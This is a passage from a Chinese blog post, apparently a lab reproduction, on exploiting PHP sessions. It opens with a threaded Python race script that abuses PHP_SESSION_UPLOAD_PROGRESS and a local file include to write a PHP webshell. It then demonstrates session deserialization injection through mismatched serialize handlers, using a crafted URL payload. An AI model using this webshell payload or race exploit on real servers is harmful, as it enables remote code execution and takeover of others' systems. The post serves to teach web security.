requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, ALL_COMPLETED, wait</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pool = ThreadPoolExecutor(<span class="number">32</span>)</span><br><span class="line">task_list = []</span><br><span class="line"></span><br><span class="line">payload = <span class="string">r&quot;&quot;&quot;&lt;?php eval(&quot;fwrite(fopen(&#x27;shell.php&#x27;, &#x27;wb&#x27;), &#x27;&lt;?php @eval(\$_POST[\\&#x27;cmd\\&#x27;]); ?&gt;&#x27;);&quot;); ?&gt;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        url = <span class="string">&quot;http://vm-ubuntu.local/index.php&quot;</span></span><br><span class="line">        headers = &#123;<span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;PHPSESSID=123&quot;</span>&#125;</span><br><span class="line">        data = &#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: payload&#125;</span><br><span class="line">        files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&quot;blank.bin&quot;</span>, io.BytesIO(<span class="string">b&#x27;\xcc&#x27;</span>*<span class="number">1024</span>*<span class="number">1024</span>))&#125;</span><br><span class="line">        requests.post(url=url,</span><br><span class="line">                      headers=headers,</span><br><span class="line">                      data=data,</span><br><span class="line">                      files=files)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_shell</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        url = <span class="string">&quot;http://vm-ubuntu.local/lfi.php&quot;</span></span><br><span class="line">        params = &#123;<span class="string">&quot;file&quot;</span>: <span class="string">&quot;/tmp/sess_123&quot;</span>&#125;</span><br><span class="line">        requests.get(url=url, params=params)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    task_list.append(pool.submit(upload))</span><br><span class="line">    task_list.append(pool.submit(write_shell))</span><br><span class="line">wait(task_list, return_when=ALL_COMPLETED)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>于是就可以成功写入<code>webshell</code>.</p>
+<h2 id="反序列化漏洞">反序列化漏洞</h2>
+<h3
+id="错误组合不同的序列化处理器导致漏洞">错误组合不同的序列化处理器导致漏洞</h3>
+<p><code>PHP</code>序列化和反序列化<code>$_SESSION</code>变量的方式由<code>session.serialize_handler</code>决定,
+<code>php_serialize</code>在<strong>5.5.4及以上</strong>的版本才可用,
+如在一个页面采用<code>php_serialize</code>进行序列化,
+而另一个页面采用<code>php</code>来反序列化,
+就会导致<code>session</code>注入漏洞.</p>
+<p>实例:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="comment">//pageA.php</span></span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;session.serialize_handler&quot;</span>, <span class="string">&quot;php_serialize&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;name&quot;</span>] = <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;age&quot;</span>] = <span class="variable">$_GET</span>[<span class="string">&quot;age&quot;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="comment">//pageB.php</span></span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;session.serialize_handler&quot;</span>, <span class="string">&quot;php&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vul</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$greet</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Exploited&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;greet.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$i</span> = <span class="keyword">new</span> <span class="title class_">Vul</span>();</span><br><span class="line">    <span class="variable">$i</span>-&gt;greet = <span class="string">&quot;Hello!&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$i</span>).<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>请求<code>pageA.php</code></p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202304062154304.png"
+alt="image-20230406215450264" />
+<figcaption aria-hidden="true">image-20230406215450264</figcaption>
+</figure>
+<p>查看<code>session</code>文件</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202304062155433.png"
+alt="image-20230406215515412" />
+<figcaption aria-hidden="true">image-20230406215515412</figcaption>
+</figure>
+<p>可以通过控制<code>name</code>或者<code>age</code>的值来实现注入,
+在前面加上<code>|</code>,
+<code>php</code>序列化处理器就会认为<code>|</code>前面的是键,
+后面是键对应的值序列化后的内容.</p>
+<p>构造URL:
+<code>http://vm-ubuntu.local/pageA.php?name=abc&amp;age=|O:3:"Vul":1:&#123;s:5:"greet";s:6:"Hahaha";&#125;;</code></p>
+<p>请求之后再次查看<code>session</code>文件</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202304062156062.png"
+alt="image-20230406215648038" />
+<figcaption aria-hidden="true">image-20230406215648038</figcaption>
+</figure>
+<p>此时再去请求<code>pageB.php</code></p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202304062158377.png"
+alt="image-20230406215830337" />
+<figcaption aria-hidden="true">image-20230406215830337</figcaption>
+</figure>
+<p>成功的调用了<code>pageB.php</code>里<code>Vul</code>类的<code>__wakeup()</code>方法,
+并实现了控制对象内部变量的值.</p>
+<blockquote>
+<p>关于这个输出是怎么来的:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Exploited    //对session文件进行反序列化前调用__wakeup()</span><br><span class="line">O:3:&quot;Vul&quot;:1:&#123;s:5:&quot;greet&quot;;s:6:&quot;Hello!&quot;;&#125;    //echo serialize($i).&quot;&lt;br/&gt;&quot; 的输出</span><br><span class="line">Hello!        //执行结束, 变量$i析构的时候调用__destruct()函数</span><br><span class="line">Hahaha        //执行结束, $_SESSION变量中的对象析构的时候调用__destruct()函数</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p>参考:</p>
+<ol type="1">
+<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2035863">浅谈
+SESSION_UPLOAD_PROGRESS 的利用 - 腾讯云开发者社区-腾讯云
+(tencent.com)</a></li>
+<li><a
+target="_blank" rel="noopener" href="https://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html">php序列化
+- l3m0n - 博客园 (cnblogs.com)</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6640">带你走进PHP
+session反序列化漏洞 - 先知社区 (aliyun.com)</a></li>
+<li><a
+target="_blank" rel="noopener" href="https://www.php.net/manual/zh/session.upload-progress.php">PHP:
+Session 上传进度 - Manual</a></li>
+</ol>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>x2658y
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://x2658y.github.io/2023/04/05/[Web]%E5%85%B3%E4%BA%8EPHP_SESSION%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8F%8A%E5%A4%8D%E7%8E%B0/" title="关于PHP_SESSION的漏洞利用及复现">https://x2658y.github.io/2023/04/05/[Web]关于PHP_SESSION的漏洞利用及复现/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"><i class="fa fa-tag"></i> Web安全</a>
+              <a href="/tags/PHP/" rel="tag"><i class="fa fa-tag"></i> PHP</a>
+              <a href="/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"><i class="fa fa-tag"></i> PHP反序列化</a>
+              <a href="/tags/PHP-SESSION/" rel="tag"><i class="fa fa-tag"></i> PHP_SESSION</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/03/31/%5BNote%5D%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E9%80%9F%E6%9F%A5/" rel="prev" title="常见CLI工具使用速查">
+                  <i class="fa fa-chevron-left"></i> 常见CLI工具使用速查
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/04/06/%5BWeb%5DPHP%E7%9A%84__wakeup()%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/" rel="next" title="PHP的__wakeup()函数漏洞">
+                  PHP的__wakeup()函数漏洞 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    
+  <div class="comments" id="disqus_thread">
+    <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+  </div>
+  
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2021 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa-solid fa-user-secret"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">x2658y</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">22k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">1:19</span>
+  </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+  <a href="https://github.com/x2658y" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+<script class="next-config" data-name="disqus" type="application/json">{"enable":true,"shortname":"x2658y","count":false,"i18n":{"disqus":"disqus"}}</script>
+<script src="/js/third-party/comments/disqus.js"></script>
+
+</body>
+</html>
